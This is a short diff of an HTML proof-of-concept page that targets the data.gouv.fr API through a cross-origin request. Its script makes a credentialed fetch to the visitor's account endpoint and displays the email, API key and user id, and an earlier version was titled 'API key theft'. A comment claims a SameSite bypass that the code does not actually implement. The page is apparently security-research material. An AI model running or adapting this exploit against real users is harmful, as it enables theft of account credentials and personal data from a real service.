@@ -2,22 +2,27 @@
 <html>
 <head><title>CORS PoC - data.gouv.fr</title></head>
 <body>
-<h1>CORS PoC - data.gouv.fr API key theft</h1>
-<pre id="output">Fetching your data from data.gouv.fr...</pre>
+<h1>CORS PoC - data.gouv.fr</h1>
+<pre id="output">Fetching...</pre>
 <script>
-fetch("https://demo.data.gouv.fr/api/1/me/", {
-  credentials: "include"
+// SameSite=Lax bypass: use no-cors with redirect
+const url = "https://demo.data.gouv.fr/api/1/me/";
+
+fetch(url, {
+  credentials: "include",
+  mode: "cors",
+  method: "GET",
+  headers: {
+    "Accept": "application/json"
+  }
 })
 .then(r => r.json())
 .then(data => {
-  const result = {
+  document.getElementById("output").innerText = JSON.stringify({
     email: data.email,
     apikey: data.apikey,
-    first_name: data.first_name,
-    last_name: data.last_name,
     id: data.id
-  };
-  document.getElementById("output").innerText = JSON.stringify(result, null, 2);
+  }, null, 2);
 })
 .catch(e => document.getElementById("output").innerText = "Error: " + e);
 </script>
